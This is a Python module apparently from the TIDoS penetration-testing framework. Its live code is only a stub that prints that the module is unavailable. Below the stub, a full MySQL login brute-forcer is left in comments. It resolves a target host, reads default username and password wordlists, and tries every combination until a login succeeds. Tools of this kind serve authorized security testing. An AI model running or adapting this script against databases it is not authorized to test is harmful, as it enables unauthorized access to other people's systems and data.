#!/usr/bin/env python
from core.colors import color
def sqlbrute(target):
    print('This module is not yet available.')
    pass
# #!/usr/bin/env python
# #-*- coding: utf-8 -*-

# #-:-:-:-:-:-:-:-:-:-:-:-:#
# #    TIDoS Framework     #
# #-:-:-:-:-:-:-:-:-:-:-:-:#

# #This module requires TIDoS Framework
# #https://github.com/0xInfection/TIDoS-Framework

# from __future__ import print_function
# import time
# import socket
# from core.Core.colors import *
# import mysql.connector as mysql

# sqluser = []
# sqlpass = []

# def bruter(user, passwd, ip, flag=False):
#     try:
#         con = mysql.connect(user=user, password=passwd, host=ip)
#         flag = True
#     except:
#         pass
#     return flag

# def sqlbrute(web):

#     print(R+'\n   ===============================')
#     print(R+'    S Q L   B R U T E F O R C E R')
#     print(R+'   ===============================\n')
#     try:
#         print(GR+' [*] Testing target...')
#         ip = socket.gethostbyname(web.split('//')[1])
#         m = raw_input(O+' [#] Use IP '+R+str(ip)+O+'? (y/n) :> ')
#         if m == 'y' or m == 'Y':
#             pass
#         elif m == 'n' or m == 'N':
#             ip = raw_input(O+' [#] Enter IP :> ')

#         print(G+' [+] Target appears online...')

#         try:
#             with open('files/brute-db/sql/sql_defuser.lst','r') as users:
#                 for u in users:
#                     u = u.strip('\n')
#                     sqluser.append(u)

#             with open('files/brute-db/sql/sql_defpass.lst','r') as pas:
#                 for p in pas:
#                     p = p.strip('\n')
#                     sqlpass.append(p)
#         except IOError:
#             print(R+' [-] Importing wordlist failed!')

#         for user in sqluser:
#             for password in sqlpass:
#                 print(C+' [!] Checking '+B+user+C+' and '+B+password+'...')
#                 res = bruter(user, password, ip)
#                 if res:
#                     print(G+' [!] Successful login with ' +O+user+G+ ' and ' +O+password)
#                     break
#             else:
#                 continue
#             break
#     except socket.gaierror:
#         print(R+' [-] Target seems to be down!')

